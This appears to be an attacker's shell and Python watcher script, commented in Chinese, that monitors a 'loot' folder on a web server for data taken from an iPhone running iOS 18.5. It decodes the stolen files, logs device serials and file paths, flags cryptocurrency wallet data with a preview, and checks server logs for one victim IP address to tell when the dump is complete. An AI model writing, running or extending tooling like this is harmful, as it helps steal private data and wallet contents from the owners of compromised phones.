#!/bin/bash
# 盯 18 链采集（iPhone13,2/18.5）：新 ext_stats 内容 + wallet 类别 + tf2d/icd2d
L=/www/wwwroot/i.131422.com/loot
SEEN=/tmp/hg18_seen.txt
HIT=/tmp/hg18_hit
: > "$SEEN"; rm -f "$HIT"
END=$(( $(date +%s) + 2400 ))
echo "[$(date -u +%T)] watcher18 start (40min cap)"
while [ "$(date +%s)" -lt "$END" ]; do
  for f in $L/*/ext_stats_*.bin; do
    [ -f "$f" ] || continue
    grep -qF "$f" "$SEEN" 2>/dev/null && continue
    echo "$f" >> "$SEEN"
    python3 - "$f" <<'PY'
import json, sys, base64, os, datetime
f = sys.argv[1]
try: j = json.load(open(f, encoding='utf-8', errors='replace'))
except Exception: sys.exit()
cat = str(j.get('category')); path = str(j.get('path'))
raw = b''
try: raw = base64.b64decode(j.get('data',''))
except Exception: pass
print('[%s] %-22s %-14s %-52s %6s B serial=%s pt=%s ov=%s' % (
  datetime.datetime.utcnow().strftime('%H:%M:%S'), os.path.basename(f)[:22], cat, path[:52],
  j.get('size'), j.get('deviceSerial'), j.get('devicePt'), j.get('deviceOv')))
if 'wallet' in cat.lower() or 'wallet' in path.lower():
    print('    >>> WALLET! %s  preview=%s' % (path, raw[:160]))
    open('/tmp/hg18_hit','a').write('WALLET\n')
PY
  done
  # tf2d / icd2d 出现 = dump 完成
  if grep -a "182.239.121.187" /www/wwwlogs/i.131422.com.log 2>/dev/null | grep -qa "tf2d\|icd2d"; then
    echo "[$(date -u +%T)] tf2d/icd2d 出现（dump 完成）"; echo DUMPDONE >> "$HIT"
  fi
  [ -s "$HIT" ] && { echo "[$(date -u +%T)] 命中"; break; }
  sleep 15
done
echo "=== watcher18 结束 $(date -u +%T) ==="
echo "--- 累计 ext_stats ---"
ls -1 $L/182.239.121.187/ext_stats_*.bin 2>/dev/null | wc -l
echo "--- 全部采集到的 path ---"
for f in $L/182.239.121.187/ext_stats_*.bin; do
  python3 -c "
import json,sys
try: j=json.load(open('$f',encoding='utf-8',errors='replace'))
except: sys.exit()
print('   %-16s %s' % (j.get('category'), j.get('path')))" 2>/dev/null
done | sort -u
